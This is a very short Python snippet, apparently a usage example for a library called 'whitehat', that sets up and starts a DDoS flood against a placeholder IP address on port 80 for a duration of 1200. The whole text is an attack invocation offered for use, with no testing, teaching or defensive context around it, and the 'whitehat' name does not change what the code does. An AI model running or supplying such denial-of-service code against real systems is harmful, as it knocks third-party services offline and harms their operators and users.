import whitehat

ddos = whitehat.ddos("ip", 80, 1200) # IP, PORT, DURATION
ddos.start()
